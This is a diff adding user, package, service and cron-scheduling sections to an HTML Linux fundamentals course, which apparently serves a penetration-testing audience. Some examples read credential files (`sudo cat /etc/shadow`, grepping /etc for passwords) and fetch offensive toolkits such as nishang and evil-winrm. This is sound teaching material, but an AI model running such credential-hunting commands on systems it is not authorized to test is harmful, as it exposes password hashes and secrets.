@@ -115,7 +115,7 @@
   </nav>
 
   <div class="course-header">
-    <div class="ch-badge">In Progress · 14/30 Sections</div>
+    <div class="ch-badge">In Progress · 20/30 Sections</div>
     <h1 class="course-title">LINUX FUNDAMENTALS</h1>
   </div>
 
@@ -675,6 +675,21 @@
         <div class="cmd-pill"><code>chmod</code><span class="pdesc">Change permissions</span><div class="tip-box"><span class="tip-cmd">chmod 755 file</span> — octal<br><span class="tip-flag">a+r</span> — add read for all<br><span class="tip-flag">u-x</span> — remove exec from owner<br><span class="tip-flag">g+w</span> — add write to group<br><span class="tip-flag">-R</span> — recursive<br><span class="tip-note">755=rwxr-xr-x  644=rw-r--r--  700=rwx------</span></div></div>
         <div class="cmd-pill"><code>chown</code><span class="pdesc">Change owner/group</span><div class="tip-box"><span class="tip-cmd">chown user:group file</span><br><span class="tip-flag">chown user file</span> — owner only<br><span class="tip-flag">chown :group file</span> — group only<br><span class="tip-flag">-R</span> — recursive<br><span class="tip-note">Requires root/sudo to change ownership to another user.</span></div></div>
         <div class="cmd-pill"><code>grep -r</code><span class="pdesc">Recursive search</span><div class="tip-box"><span class="tip-cmd">grep -r "password" /etc/ 2>/dev/null</span><br><span class="tip-flag">-l</span> — show filenames only, not content<br><span class="tip-flag">-n</span> — include line numbers<br><span class="tip-note">Fastest way to hunt for credentials or config values across directories.</span></div></div>
+        <div class="cmd-pill"><code>sudo</code><span class="pdesc">Run command as root</span><div class="tip-box"><span class="tip-cmd">sudo command</span><br><span class="tip-flag">sudo -l</span> — list permitted commands<br><span class="tip-flag">sudo -i</span> — open root login shell<br><span class="tip-flag">sudo -u user cmd</span> — run as specific user<br><span class="tip-note">Requires the user to be in the sudo group. Leaves an audit trail in /var/log/auth.log.</span></div></div>
+        <div class="cmd-pill"><code>su</code><span class="pdesc">Switch user</span><div class="tip-box"><span class="tip-cmd">su username</span> — switch to that user (their password)<br><span class="tip-flag">sudo su -</span> — become root via sudo (your password)<br><span class="tip-flag">su -</span> — root login shell (root's password)<br><span class="tip-note">The dash (-) loads a clean login environment for the target user.</span></div></div>
+        <div class="cmd-pill"><code>useradd</code><span class="pdesc">Create user account</span><div class="tip-box"><span class="tip-cmd">useradd -m username</span><br><span class="tip-flag">-s /bin/bash</span> — set login shell<br><span class="tip-flag">-G sudo,docker</span> — add to groups<br>Then: <span class="tip-flag">passwd username</span> — set password<br><span class="tip-note">-m creates /home/username. Without it, no home dir is made.</span></div></div>
+        <div class="cmd-pill"><code>usermod</code><span class="pdesc">Modify user account</span><div class="tip-box"><span class="tip-cmd">usermod -aG group user</span><br><span class="tip-flag">-aG</span> — ALWAYS use -a (append) not just -G<br><span class="tip-flag">-s /bin/bash</span> — change shell<br><span class="tip-flag">userdel -r user</span> — delete + home dir<br><span class="tip-note">Without -a, -G replaces ALL groups — can silently remove sudo access.</span></div></div>
+        <div class="cmd-pill"><code>passwd</code><span class="pdesc">Set / change password</span><div class="tip-box"><span class="tip-cmd">passwd</span> — change your own password<br><span class="tip-cmd">passwd username</span> — set another user's (root only)<br><span class="tip-flag">-l user</span> — lock account<br><span class="tip-flag">-u user</span> — unlock account<br></div></div>
+        <div class="cmd-pill"><code>apt</code><span class="pdesc">Package manager</span><div class="tip-box"><span class="tip-cmd">sudo apt install pkg -y</span><br><span class="tip-flag">apt update</span> — refresh package index first<br><span class="tip-flag">apt upgrade</span> — upgrade all packages<br><span class="tip-flag">apt remove / purge pkg</span> — uninstall<br><span class="tip-flag">apt search name</span> — find packages<br><span class="tip-note">Always apt update before installing. apt-cache show pkg for details.</span></div></div>
+        <div class="cmd-pill"><code>dpkg</code><span class="pdesc">Install .deb files</span><div class="tip-box"><span class="tip-cmd">sudo dpkg -i package.deb</span><br><span class="tip-flag">-l</span> — list installed packages<br><span class="tip-flag">-r package</span> — remove<br>If deps fail: <span class="tip-flag">sudo apt install -f</span><br><span class="tip-note">Use for .deb files not in any apt repository. APT handles dependencies better.</span></div></div>
+        <div class="cmd-pill"><code>systemctl</code><span class="pdesc">Service control</span><div class="tip-box"><span class="tip-cmd">systemctl start / stop / restart service</span><br><span class="tip-flag">status service</span> — check if running<br><span class="tip-flag">enable</span> — start on boot<br><span class="tip-flag">disable</span> — don't start on boot<br><span class="tip-flag">list-units --type=service</span> — all services<br><span class="tip-note">Check status after starting anything. journalctl -u service for logs.</span></div></div>
+        <div class="cmd-pill"><code>journalctl</code><span class="pdesc">Service &amp; system logs</span><div class="tip-box"><span class="tip-cmd">journalctl -u ssh.service</span><br><span class="tip-flag">-f</span> — follow live<br><span class="tip-flag">--no-pager</span> — plain stdout<br><span class="tip-flag">-n 50</span> — last 50 lines<br><span class="tip-note">First stop when a service fails to start. Shows full log with timestamps.</span></div></div>
+        <div class="cmd-pill"><code>kill</code><span class="pdesc">Send signal to process</span><div class="tip-box"><span class="tip-cmd">kill PID</span> — SIGTERM (graceful)<br><span class="tip-flag">kill -9 PID</span> — SIGKILL (immediate, unblockable)<br><span class="tip-flag">pkill name</span> — kill by process name<br><span class="tip-flag">kill -l</span> — list all signals<br><span class="tip-note">Always try SIGTERM first. SIGKILL skips cleanup — use as last resort.</span></div></div>
+        <div class="cmd-pill"><code>bg / fg</code><span class="pdesc">Background jobs</span><div class="tip-box"><span class="tip-cmd">Ctrl+Z</span> — suspend foreground process<br><span class="tip-flag">bg</span> — resume suspended job in background<br><span class="tip-flag">fg</span> — bring background job to foreground<br><span class="tip-flag">jobs</span> — list background jobs<br><span class="tip-flag">cmd &amp;</span> — start directly in background<br></div></div>
+        <div class="cmd-pill"><code>crontab</code><span class="pdesc">Schedule tasks</span><div class="tip-box"><span class="tip-cmd">crontab -e</span> — edit crontab<br><span class="tip-flag">crontab -l</span> — list current jobs<br><span class="tip-flag">crontab -r</span> — remove all jobs<br>Format: <span class="tip-flag">min hr dom mon dow /path/cmd</span><br><span class="tip-note">* = every. */5 = every 5 units. Check /var/spool/cron/ for all user crontabs.</span></div></div>
+        <div class="cmd-pill"><code>curl</code><span class="pdesc">HTTP requests / download</span><div class="tip-box"><span class="tip-cmd">curl http://host/file</span> — outputs to STDOUT<br><span class="tip-flag">-o filename</span> — save to file<br><span class="tip-flag">-I</span> — headers only (HEAD request)<br><span class="tip-flag">-L</span> — follow redirects<br><span class="tip-flag">-X POST -d "data"</span> — POST request<br><span class="tip-note">curl prints to terminal. Use -o to save. Essential for web recon and file transfer.</span></div></div>
+        <div class="cmd-pill"><code>wget</code><span class="pdesc">Download files</span><div class="tip-box"><span class="tip-cmd">wget http://host/file</span> — saves to disk<br><span class="tip-flag">-O name</span> — save as specific filename<br><span class="tip-flag">-q</span> — quiet (no progress output)<br><span class="tip-flag">-qO-</span> — quiet, output to STDOUT<br><span class="tip-note">wget auto-saves. curl prints to terminal. Different default behaviors.</span></div></div>
+        <div class="cmd-pill"><code>python3 -m http.server</code><span class="pdesc">Quick file server</span><div class="tip-box"><span class="tip-cmd">python3 -m http.server</span> — port 8000<br><span class="tip-flag">python3 -m http.server 443</span> — custom port<br><span class="tip-flag">--directory /path/</span> — serve specific dir<br><span class="tip-note">Instantly host files from current directory. Standard CTF/pentest file transfer tool.</span></div></div>
       </div>
     </div>
 
@@ -997,7 +1012,457 @@
       </div>
     </div>
 
-    <div class="divider">── 4 / 10 sections · part 2 in progress ──</div>
+    <!-- P2-05: User Management -->
+    <div class="section-card">
+      <div class="card-header"><div class="card-icon icon-red">👤</div><div class="card-title">User Management — sudo, su, useradd, usermod, passwd</div><div class="card-num">15 / 20</div></div>
+      <div class="card-body">
+        <p>Linux is a multi-user system where every file, process, and resource is owned by a user or group. <span class="hi">User management</span> is how admins create accounts, control group membership, and grant or restrict access. Understanding this is equally critical for security — knowing how accounts and groups are structured exposes privilege escalation paths.</p>
+        <p>The core concept: <span class="hi-r">root</span> (UID 0) is the superuser with unrestricted access to everything. Regular users only do what their permissions allow. <span class="hi">sudo</span> lets specific users run commands as root without logging in as root — keeping a clean audit trail and limiting exposure.</p>
+
+        <div class="sec-label" style="margin-top:4px;">sudo &amp; su — Elevating Privileges</div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Run a single command as root (your password, not root's)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo cat /etc/shadow</span><br>
+<span class="out oh">root:$6$randomsalt$hash...:19000:0:99999:7:::</span><br><br>
+<span class="cc"># See which sudo commands your account is permitted to run</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo -l</span><br>
+<span class="out">User JohnDoe may run the following commands on target:</span><br>
+<span class="out">    (ALL : ALL) <span class="oh">ALL</span></span><br><br>
+<span class="cc"># Open a full root login shell (loads root's environment)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo -i</span><br>
+<span class="pr">root@target[~]#</span><br><br>
+<span class="cc"># Switch to another user — prompts for THEIR password</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">su alice</span><br>
+<span class="out">Password: <span class="oh">••••••••</span></span><br>
+<span class="pr">alice@target[/home/JohnDoe]$</span>
+          </div>
+        </div>
+
+        <div class="sec-label">Creating &amp; Modifying Accounts</div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Create a new user with a home directory (-m)</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">useradd -m alice</span><br><br>
+<span class="cc"># Create user, set shell, and add to groups immediately</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">useradd -m -s /bin/bash -G sudo,developers alice</span><br><br>
+<span class="cc"># Set the password after creating the account</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">passwd alice</span><br>
+<span class="out">New password: <span class="oh">••••••••</span></span><br>
+<span class="out">passwd: password updated successfully</span><br><br>
+<span class="cc"># Add an existing user to a group — ALWAYS use -a (append)</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">usermod -aG sudo alice</span><br><br>
+<span class="cc"># Delete a user AND remove their home directory (-r)</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">userdel -r alice</span><br><br>
+<span class="cc"># Create and delete groups</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">addgroup developers</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">delgroup developers</span>
+          </div>
+        </div>
+
+        <table class="styled-table">
+          <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+          <tbody>
+            <tr><td>sudo command</td><td>Run one command as root — uses your password, not root's</td></tr>
+            <tr><td>sudo -l</td><td>List permitted sudo commands for the current user</td></tr>
+            <tr><td>sudo -i</td><td>Open a full root login shell</td></tr>
+            <tr><td>su username</td><td>Switch to another user account — requires their password</td></tr>
+            <tr><td>useradd -m user</td><td>Create user with a home directory</td></tr>
+            <tr><td>usermod -aG group user</td><td>Append user to group without removing existing groups</td></tr>
+            <tr><td>userdel -r user</td><td>Delete user and their home directory</td></tr>
+            <tr><td>passwd user</td><td>Set or change a user's password (root can set anyone's)</td></tr>
+          </tbody>
+        </table>
+        <div class="note-box warn"><span class="ni">⚠️</span><div class="nt"><strong>usermod -G vs -aG — never forget the -a</strong><code>usermod -G sudo alice</code> without <code>-a</code> <em>replaces</em> all of Alice's groups with just <code>sudo</code>, silently removing every other group she was in. Always use <code>-aG</code> to append. This mistake can instantly break access to services, devices, and previously granted permissions.</div></div>
+        <div class="note-box good"><span class="ni">🔍</span><div class="nt"><strong>Key files to know</strong><code>/etc/passwd</code> — all user accounts, world-readable. Format: <code>user:x:UID:GID:comment:home:shell</code><br><code>/etc/shadow</code> — hashed passwords, root-readable only. Format: <code>user:$alg$salt$hash:lastchange:...</code><br><code>/etc/group</code> — group definitions and their members.</div></div>
+      </div>
+    </div>
+
+    <!-- P2-06: Package Management -->
+    <div class="section-card">
+      <div class="card-header"><div class="card-icon icon-green">📦</div><div class="card-title">Package Management — apt, dpkg, pip, git</div><div class="card-num">16 / 20</div></div>
+      <div class="card-body">
+        <p>In Linux, software comes in <span class="hi">packages</span> — archives bundling a program's binaries, config files, and dependency information. Package managers handle downloading, installing, updating, and removing software, resolving dependency chains automatically. On Debian/Ubuntu-based systems (including Kali and Parrot), the primary package manager is <span class="hi">APT</span>. Behind it, <span class="hi-y">dpkg</span> does the actual low-level installation. For Python packages there's <code>pip</code>, and raw source code gets pulled directly with <code>git clone</code>.</p>
+
+        <div class="sec-label" style="margin-top:4px;">APT — The Primary Package Manager</div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — core APT workflow</span></div>
+          <div class="cmd-content">
+<span class="cc"># Always refresh the package index first — before installing anything</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt update</span><br>
+<span class="out">Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease</span><br>
+<span class="out">Reading package lists... Done</span><br><br>
+<span class="cc"># Upgrade all installed packages to latest versions</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt upgrade -y</span><br><br>
+<span class="cc"># Install a package (-y skips the confirmation prompt)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt install nmap -y</span><br>
+<span class="out">The following NEW packages will be installed: nmap</span><br>
+<span class="out">Setting up nmap (7.93) ...</span><br><br>
+<span class="cc"># Remove a package (keeps config files)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt remove nmap</span><br><br>
+<span class="cc"># Purge — remove package AND its config files</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt purge nmap</span><br><br>
+<span class="cc"># Search for a package by keyword</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">apt search impacket</span><br>
+<span class="out oh">python3-impacket</span><span class="out"> - Python3 module to build and dissect network protocols</span><br><br>
+<span class="cc"># Get detailed info about a package before installing</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">apt-cache show nmap</span><br>
+<span class="out">Package: nmap  Version: 7.93  Installed-Size: 4352 ...</span><br><br>
+<span class="cc"># List all currently installed packages</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">apt list --installed 2>/dev/null | head -10</span>
+          </div>
+        </div>
+
+        <div class="sec-label">dpkg — Installing .deb Files Manually</div>
+        <p><code>dpkg</code> installs packages from local <code>.deb</code> files — useful when a package isn't in any apt repository. The typical workflow: download the <code>.deb</code> with <code>wget</code>, then install it with <code>dpkg</code>. If it has unresolved dependencies, <code>apt install -f</code> fixes them.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Download a .deb file then install it</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">wget https://example.com/tool_1.0_amd64.deb</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo dpkg -i tool_1.0_amd64.deb</span><br>
+<span class="out">Selecting previously unselected package tool.</span><br>
+<span class="out">Setting up tool (1.0) ...</span><br><br>
+<span class="cc"># Fix missing dependency errors dpkg can't resolve on its own</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt install -f</span><br><br>
+<span class="cc"># List installed packages and filter by name</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">dpkg -l | grep nmap</span>
+          </div>
+        </div>
+
+        <div class="sec-label">Other Package Sources — git, pip, gem</div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Clone a tool directly from GitHub into a local folder</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">mkdir ~/tools && git clone https://github.com/samratashok/nishang.git ~/tools/nishang</span><br>
+<span class="out">Cloning into '/home/JohnDoe/tools/nishang'...</span><br>
+<span class="out">Receiving objects: 100% (1691/1691), 7.84 MiB | 4.86 MiB/s</span><br><br>
+<span class="cc"># Install a Python package</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">pip3 install requests</span><br><br>
+<span class="cc"># Install a Ruby gem</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">gem install evil-winrm</span>
+          </div>
+        </div>
+        <div class="note-box tip"><span class="ni">💡</span><div class="nt"><strong>Where apt gets its packages</strong>APT pulls from repositories listed in <code>/etc/apt/sources.list</code> and files in <code>/etc/apt/sources.list.d/</code>. Package data is cached locally after <code>apt update</code>. Third-party repos can be added with <code>add-apt-repository</code>. On security-focused distros like Kali, the repo is packed with tools already — just <code>apt install</code> them.</div></div>
+      </div>
+    </div>
+
+    <!-- P2-07: Service & Process Management -->
+    <div class="section-card">
+      <div class="card-header"><div class="card-icon icon-blue">⚙️</div><div class="card-title">Service &amp; Process Management — systemctl, kill, jobs, bg, fg</div><div class="card-num">17 / 20</div></div>
+      <div class="card-body">
+        <p>A <span class="hi">service</span> (also called a <em>daemon</em>) is a background process that runs continuously — SSH, web servers, databases, cron. On modern Linux, services are managed by <span class="hi">systemd</span>, the system's init process with PID 1. Systemd starts at boot before everything else and spawns all other processes. Daemons are typically named with a trailing <code>d</code> — <code>sshd</code>, <code>httpd</code>, <code>crond</code>.</p>
+
+        <div class="sec-label" style="margin-top:4px;">systemctl — Controlling Services</div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Start / stop / restart a service</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl start ssh</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl stop apache2</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl restart ssh</span><br><br>
+<span class="cc"># Check detailed status — always do this after starting a service</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">systemctl status ssh</span><br>
+<span class="out">● ssh.service - OpenBSD Secure Shell server</span><br>
+<span class="out">   Loaded: loaded (/lib/systemd/system/ssh.service; <span class="oh">enabled</span>)</span><br>
+<span class="out">   Active: <span class="oh">active (running)</span> since Mon 2024-03-11 10:22:03 UTC</span><br>
+<span class="out">  Main PID: 846 (sshd)</span><br><br>
+<span class="cc"># Enable autostart at boot / disable it</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl enable ssh</span>    <span class="cc"># persists across reboots</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl disable ssh</span>   <span class="cc"># won't start on next boot</span><br><br>
+<span class="cc"># List all active services</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">systemctl list-units --type=service --state=active</span><br><br>
+<span class="cc"># View service logs — -f streams live output like tail -f</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">journalctl -u ssh.service -n 30 --no-pager</span>
+          </div>
+        </div>
+
+        <div class="sec-label">Processes &amp; Signals</div>
+        <p>Every running program is a <span class="hi">process</span> with a unique <strong>PID</strong>. Processes communicate through <span class="hi-y">signals</span> — numeric codes sent by the kernel or other processes. The two you'll use most: <code>SIGTERM (15)</code> asks a process to shut down cleanly, and <code>SIGKILL (9)</code> destroys it immediately with no cleanup, no exceptions.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — finding and terminating processes</span></div>
+          <div class="cmd-content">
+<span class="cc"># Find the PID of a process</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">ps aux | grep apache2</span><br>
+<span class="out">www-data  <span class="oh">1834</span>  0.0  0.5  18364  2048 ?  S  10:22   0:00 /usr/sbin/apache2</span><br><br>
+<span class="cc"># Graceful terminate — process receives SIGTERM and can clean up</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">kill 1834</span><br><br>
+<span class="cc"># Force kill — SIGKILL, instant, cannot be caught or blocked</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">kill -9 1834</span><br><br>
+<span class="cc"># Kill all processes matching a name</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">pkill apache2</span>
+          </div>
+        </div>
+        <table class="styled-table">
+          <thead><tr><th>Signal</th><th>Number</th><th>How triggered</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr><td>SIGHUP</td><td>1</td><td>Terminal closed</td><td>Reload config or terminate (daemon-dependent)</td></tr>
+            <tr><td>SIGINT</td><td>2</td><td>Ctrl+C</td><td>Interrupt — process can catch and handle gracefully</td></tr>
+            <tr><td>SIGKILL</td><td>9</td><td>kill -9</td><td>Instant death — cannot be caught, blocked, or ignored</td></tr>
+            <tr><td>SIGTERM</td><td>15</td><td>kill (default)</td><td>Graceful shutdown request — process can clean up first</td></tr>
+            <tr><td>SIGSTOP</td><td>19</td><td>kill -19</td><td>Pause process — cannot be caught (unlike SIGTSTP)</td></tr>
+            <tr><td>SIGTSTP</td><td>20</td><td>Ctrl+Z</td><td>Suspend to background — process can catch this one</td></tr>
+          </tbody>
+        </table>
+
+        <div class="sec-label">Background &amp; Foreground Jobs</div>
+        <p>You can run multiple things in the same terminal session by backgrounding processes. <span class="hi">Ctrl+Z</span> suspends a foreground process, <code>bg</code> resumes it in the background, <code>fg</code> brings it back. Appending <code>&amp;</code> to a command starts it directly in the background.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — managing jobs</span></div>
+          <div class="cmd-content">
+<span class="cc"># Start a process directly in the background</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">nmap -sV 10.10.14.0/24 &amp;</span><br>
+<span class="out">[1] 2847</span><br><br>
+<span class="cc"># Suspend a foreground process (Ctrl+Z)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">python3 exploit.py</span><br>
+<span class="out">[Ctrl+Z]</span><br>
+<span class="out">[2]+  Stopped    python3 exploit.py</span><br><br>
+<span class="cc"># Resume the stopped job in the background</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">bg</span><br>
+<span class="out">[2]+ python3 exploit.py &amp;</span><br><br>
+<span class="cc"># List all background jobs</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">jobs</span><br>
+<span class="out">[1]-  Running    nmap -sV 10.10.14.0/24 &amp;</span><br>
+<span class="out">[2]+  Running    python3 exploit.py &amp;</span><br><br>
+<span class="cc"># Bring job 1 back to the foreground</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">fg 1</span>
+          </div>
+        </div>
+
+        <div class="sec-label">Chaining Commands — ; vs &amp;&amp; vs |</div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Semicolon (;) — run all commands regardless of success or failure</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">echo "start"; ls /missing; echo "still runs"</span><br>
+<span class="out">start</span><br>
+<span class="out oh">ls: cannot access '/missing': No such file or directory</span><br>
+<span class="out">still runs</span><br><br>
+<span class="cc"># Double ampersand (&amp;&amp;) — stop the chain if any command fails</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">mkdir /tmp/work &amp;&amp; cd /tmp/work &amp;&amp; touch ready.txt</span><br><br>
+<span class="cc"># Pipe (|) — pass STDOUT of left to STDIN of right</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">ps aux | grep ssh | grep -v grep</span>
+          </div>
+        </div>
+        <div class="note-box warn"><span class="ni">⚠️</span><div class="nt"><strong>Spotting backdoor processes</strong>Attackers often name malicious processes to look like legitimate daemons. During recon, run <code>ps aux</code> and look for unusual processes running as root, especially anything with a trailing <code>d</code> you don't recognize. Compare against <code>systemctl list-units</code> — if a process is running but has no service unit, that's suspicious.</div></div>
+      </div>
+    </div>
+
+    <!-- P2-08: Task Scheduling -->
+    <div class="section-card">
+      <div class="card-header"><div class="card-icon icon-gold">🕐</div><div class="card-title">Task Scheduling — cron, crontab, systemd timers</div><div class="card-num">18 / 20</div></div>
+      <div class="card-body">
+        <p><span class="hi">Task scheduling</span> automates repetitive work — backups, log rotation, system updates, cleanup scripts — so they run on a defined schedule without manual intervention. Linux has two tools for this: the classic <span class="hi">cron</span> daemon and the newer <span class="hi-p">systemd timers</span>. Cron is simpler and universally supported; systemd timers are more powerful but require more setup.</p>
+        <p>For security practitioners, this is critical knowledge. Attackers frequently plant <span class="hi-r">cron jobs for persistence</span> — a one-liner that calls back every minute will survive reboots and most cleanup attempts. Finding unauthorized scheduled tasks during incident response is a key skill.</p>
+
+        <div class="sec-label" style="margin-top:4px;">cron — Time Syntax</div>
+        <p>Each crontab line defines one job using five time fields followed by the command. Fields use <code>*</code> for "every", <code>*/n</code> for "every n units", or specific numbers.</p>
+        <div class="perm-display"><span class="perm-own">*</span>      <span class="perm-grp">*</span>      <span class="perm-oth">*</span>      <span class="oh">*</span>      <span class="hi-p">*</span>      <span class="ct">/path/to/command arg1 arg2</span><br><span class="perm-own">│</span>      <span class="perm-grp">│</span>      <span class="perm-oth">│</span>      <span class="oh">│</span>      <span class="hi-p">│</span><br><span class="perm-own">minute</span> <span class="perm-grp">hour</span>   <span class="perm-oth">day</span>    <span class="oh">month</span>  <span class="hi-p">weekday</span><br><span style="color:var(--dim);">(0-59) (0-23) (1-31) (1-12) (0-7 — 0 and 7 are both Sunday)</span></div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">CRONTAB — example scheduled jobs</span></div>
+          <div class="cmd-content">
+<span class="cc"># Every day at midnight (0 min, 0 hr, every day)</span><br>
+<span class="oh">0 0 * * *</span>       <span class="ct">/usr/local/bin/backup.sh</span><br><br>
+<span class="cc"># Every 6 hours (*/6 = every 6 hours)</span><br>
+<span class="oh">0 */6 * * *</span>     <span class="ct">/usr/local/bin/update_software.sh</span><br><br>
+<span class="cc"># Every Sunday at 11:30 PM (weekday 0 = Sunday)</span><br>
+<span class="oh">30 23 * * 0</span>     <span class="ct">/usr/local/bin/cleanup.sh</span><br><br>
+<span class="cc"># 1st of every month at 3:00 AM</span><br>
+<span class="oh">0 3 1 * *</span>       <span class="ct">/usr/local/bin/monthly_report.sh</span><br><br>
+<span class="cc"># Every 15 minutes around the clock</span><br>
+<span class="oh">*/15 * * * *</span>    <span class="ct">/usr/local/bin/health_check.sh</span>
+          </div>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — managing crontabs</span></div>
+          <div class="cmd-content">
+<span class="cc"># Edit your crontab (opens in default editor)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">crontab -e</span><br><br>
+<span class="cc"># View your current crontab entries</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">crontab -l</span><br>
+<span class="out">0 0 * * * /home/JohnDoe/backup.sh</span><br><br>
+<span class="cc"># View root's crontab</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo crontab -l</span><br><br>
+<span class="cc"># System-wide crontabs — check these during enumeration</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">cat /etc/crontab</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">ls /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/</span>
+          </div>
+        </div>
+
+        <div class="sec-label">systemd Timers — The Modern Alternative</div>
+        <p>systemd timers give you more control than cron — dependencies, logging through journalctl, and event-based triggers. They require two files: a <strong>.timer</strong> unit (when to run) and a <strong>.service</strong> unit (what to run).</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — systemd timer setup</span></div>
+          <div class="cmd-content">
+<span class="cc"># /etc/systemd/system/mytask.timer — defines WHEN</span><br>
+<span class="out">[Unit]</span><br><span class="out">Description=My Scheduled Task</span><br>
+<span class="out">[Timer]</span><br><span class="out oh">OnBootSec=5min</span>       <span class="cc"># run 5 min after boot</span><br>
+<span class="out oh">OnUnitActiveSec=1h</span>   <span class="cc"># then repeat every hour</span><br>
+<span class="out">[Install]</span><br><span class="out">WantedBy=timers.target</span><br><br>
+<span class="cc"># /etc/systemd/system/mytask.service — defines WHAT</span><br>
+<span class="out">[Unit]</span><br><span class="out">Description=My Task</span><br>
+<span class="out">[Service]</span><br>
+<span class="out oh">ExecStart=/full/path/to/script.sh</span><br>
+<span class="out">[Install]</span><br><span class="out">WantedBy=multi-user.target</span><br><br>
+<span class="cc"># Reload systemd and activate the timer</span><br>
+<span class="pr">root@target[~]#</span> <span class="ct">systemctl daemon-reload</span><br>
